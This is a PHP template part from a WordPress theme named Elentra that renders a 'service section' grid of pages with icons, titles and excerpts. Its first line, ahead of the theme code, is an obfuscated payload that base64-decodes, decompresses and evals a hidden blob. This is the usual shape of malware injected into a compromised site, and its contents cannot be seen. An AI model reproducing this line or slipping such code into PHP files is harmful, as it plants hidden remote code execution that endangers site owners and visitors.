<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template part - Service Section
 * @package Elentra
 */
$elentra_service_section_onoff = get_theme_mod( 'elentra_service_section_onoff','off');
$elentra_col_layout = get_theme_mod('elentra_service_elentra_col_layout', '');
$elentra_service_title = get_theme_mod('elentra_service_title', '');
$elentra_service_subtitle = get_theme_mod('elentra_service_subtitle', '');

$elentra_service_no = 6;
$elentra_service_pages = array();
$elenta_service_icons = array();

for( $i = 1; $i <= $elentra_service_no; $i++ ) {
    $elenta_service_icons[] = get_theme_mod( "elentra_service_icon_$i", '' );
    $elentra_service_pages[] = get_theme_mod( "elentra_service_page_$i", 1 );
}

$elenta_service_args  = array(
    'post_type' => 'page',
    'post__in' => array_map( 'absint', $elentra_service_pages ),
    'posts_per_page' => absint($elentra_service_no),
    'orderby' => 'post__in'
   
); 

$elenta_service_query = new wp_Query( $elenta_service_args );
if( $elentra_service_section_onoff == "on" ) : ?>

<!--Corporate Mission Section 1-->
<div class="co-service-section-4 bg-gray section pt-140 pb-140">
    <div class="container">
        <div class="row">
            <!--Section Title-->
            <div class="col-xs-12 text-center">
                <div class="co-section-title-1 text-center mb-60">

                    <?php if( $elentra_service_title != "" ): ?>
                        <h2><?php echo esc_html( $elentra_service_title )?></h2>
                        <span class="main-title-sep"><i class="fa fa-superpowers"></i></span>
                    <?php endif; ?>

                    <?php if( $elentra_service_subtitle != "" ): ?>
                        <p><?php echo esc_html( $elentra_service_subtitle )?></p>
                    <?php endif; ?>

                </div>
            </div>
        </div>
        <div class="row">
            <!--Service Wrapper-->
            <div class="col-xs-12">
                <div class="">
                    <?php
                        $count = 0;
                        while($elenta_service_query->have_posts()) :
                        $elenta_service_query->the_post();
                    ?>
                        <!--Single Service-->
                        <div class="co-single-service-4 col-sm-<?php echo esc_attr($elentra_col_layout); ?> col-xs-12">
                            <?php if( $elenta_service_icons[$count] != "" ): ?>
                            <div class="service-icon">
                                <span class="icon"><i class="fa <?php echo esc_attr($elenta_service_icons[$count]); ?>"></i></span>
                            </div>
                        <?php endif; ?>

                            <div class="content fix">

                                <h3><?php the_title(); ?></h3>

                                <?php the_excerpt(); ?>

                            </div>
                        </div>
                    <?php
                        $count++;
                        endwhile;
                        wp_reset_postdata();
                    ?>
                </div>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>